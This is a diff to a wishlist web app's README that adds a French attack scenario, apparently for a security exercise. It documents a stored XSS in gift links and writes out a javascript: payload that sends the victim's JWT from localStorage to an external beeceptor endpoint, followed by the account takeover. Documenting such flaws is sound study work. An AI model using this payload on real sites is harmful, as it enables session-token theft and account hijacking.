@@ -44,3 +44,18 @@ The following pages require the user to be logged in :
 **My Wishlists :** see your wishlists and invite some friends with the link. Add, edit or remove gifts or delete the wishlist.
 
 **Friends' Wishlists :** access the wishlists you are invited to and choose some gifts you will buy to them. You can see which gifts are available.
+
+
+## Scenario d'attaque
+
+L'application est vulnérable aux XSS sur les liens des différents cadeaux : il est possible d'écrire `javascript:alert(1)` pour qu'au clic, une alerte s'affiche.
+
+On joue l'attaque suivante : 
+
+Sopalinge se connecte et crée un nouveau cadeau dans sa wishlist dont le lien contient le code suivant : `javascript:var xhr = new XMLHttpRequest();xhr.open("GET", "http://sopalinge.free.beeceptor.com/" + window.localStorage['santaToken'], false);xhr.send();`
+
+Sopalinge se connecte à son endpoint beeceptor : `http://sopalinge.free.beeceptor.com/`.
+
+Futex se connecte et consulte la wishlist de Sopalinge. Il clique sur le lien malveillant de Sopalinge et ne se rend compte de rien.
+
+Pendant ce temps, Sopalinge récupère une requête sur son endpoint qui contient le token jwt de Futex. Il peut alors se connecter au site et modifier son token par celui de Futex et avoir accès à son compte !
